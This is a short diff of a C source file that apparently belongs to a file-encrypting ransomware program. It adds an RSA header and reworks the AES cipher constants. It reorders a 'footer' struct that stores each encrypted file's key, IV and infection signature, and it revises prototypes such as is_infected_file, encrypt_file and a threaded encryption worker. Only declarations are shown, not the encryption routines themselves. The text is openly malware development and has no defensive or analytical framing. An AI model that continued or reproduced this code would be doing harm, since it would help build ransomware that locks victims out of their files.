@@ -12,6 +12,7 @@
 #include <sys/stat.h>
 #include <openssl/aes.h>
 #include <openssl/evp.h>
+#include <openssl/rsa.h>
 
 /* if this is defined, then the vector will double in capacity each
  * time it runs out of space. if it is not defined, then the vector will
@@ -22,11 +23,12 @@
 #include "cvector.h"
 
 /* Macro constants */
-#define AES_128 0
-#define AES_192 1
-#define AES_256 2
-#define AES_MODE_ECB 0
-#define AES_MODE_CBC 1
+#define AES_128_ECB 0
+#define AES_192_ECB 1
+#define AES_256_ECB 2
+#define AES_128_CBC 3
+#define AES_192_CBC 4
+#define AES_256_CBC 5
 #define MAX_PATH_LENGTH 256
 #define CIPHER_MODE_LENGTH 8
 #define CIPHER_NAME_LENGTH 12
@@ -57,17 +59,17 @@ typedef struct
 
 typedef struct
 {
-    int signature;
-    int key_size;
-    int mode;
-    unsigned char* key;
     unsigned char* iv;
+    unsigned char* key;
+    int mode;
+    int signature;
 } footer;
 
 /* Prototype of functions */
 void print_usage();
 int is_infected_file(char* path);
-int encryption_worker_proc(thread_args* args);
+int ciphername_to_number(char* ciphername);
+int worker_encryption_proc(thread_args* args);
 int encrypt_file(char* path, char* ciphername);
 int gen_random_bytes(unsigned char* buf, int size);
 int is_valid_options(int key_size, char* mode, char* target);
